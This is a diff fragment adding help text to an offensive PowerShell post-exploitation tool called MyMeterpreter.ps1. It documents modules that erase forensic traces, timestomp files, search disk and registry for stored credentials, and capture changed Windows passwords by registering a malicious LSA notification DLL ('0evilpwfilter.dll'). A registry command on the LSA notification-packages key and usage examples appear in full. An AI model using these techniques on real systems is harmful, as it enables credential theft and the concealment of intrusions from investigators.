+      PS C:\> .\MyMeterpreter.ps1 -CleanTracks Paranoid
+      Remark: Paranoid @arg deletes @MyMeterpreter auxiliary scripts
+
+   .OUTPUTS
+      Function    Date     DataBaseEntrys ModifiedRegKeys ScriptsCleaned
+      --------    ----     -------------- --------------- --------------
+      CleanTracks 22:17:29 20             3               2
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "GetPasswords"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Author: @mubix|@r00t-3xp10it
+      Helper - Stealing passwords every time they change {mitre T1174}
+
+   .DESCRIPTION
+      -GetPasswords Dump Explores a native OS notification of when
+      the user account password gets changed which is responsible for
+      validating it. That means that the password can be intercepted and logged.
+      -GetPasswords Enum searchs credentials in disk\regedit diferent locations.
+
+   .NOTES
+      -GetPasswords Dump requires Administrator privileges to add reg keys
+      And the manual deletion of `$Env:WINDIR\System32\0evilpwfilter.dll from
+      target disk at the end and also the deletion of the follow registry key:
+      hklm\system\currentcontrolset\control\lsa /v "notification packages" /d scecli\0evilpwfilter
+      REG ADD "HKLM\System\CurrentControlSet\Control\lsa" /v "notification packages" /t REG_MULTI_SZ /d scecli /f
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetPasswords Enum
+      Dumps passwords from disk\regedit diferent locations
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetPasswords Enum -StartDir `$Env:USERPROFILE
+      Searches for credentials recursive in text files starting in -StartDir
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetPasswords Dump
+      Intercepts user changed passwords {logon}
+
+   .OUTPUTS
+      Time     Status  ReportFile           VulnDLLPath
+      ----     ------  ----------           -----------
+      17:49:23 active  C:\Temp\logFile.txt  C:\Windows\System32\0evilpwfilter.dll
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "FileMace" -or $Help -ieq "Date"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Change file mace time {timestamp}
+
+   .DESCRIPTION
+      This module changes the follow mace propertys:
+      creationtime, lastaccesstime, LastWriteTime
+
+   .NOTES
+      -Date parameter format: "08 March 1999 19:19:19"
+      Remark: Double quotes are mandatory in -Date parameter
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -FileMace `$Env:TMP\test.txt
+      Changes sellected file mace using MyMeterprter default -Date value
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -FileMace `$Env:TMP\test.txt -date "08 March 1999 19:19:19"
+      Changes sellected file mace using user inputed -Date value
+
+   .OUTPUTS
+      FullName                        Exists CreationTime       
+      --------                        ------ ------------       
+      C:\Users\pedro\Desktop\test.txt   True 08/03/1999 19:19:19
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
 }
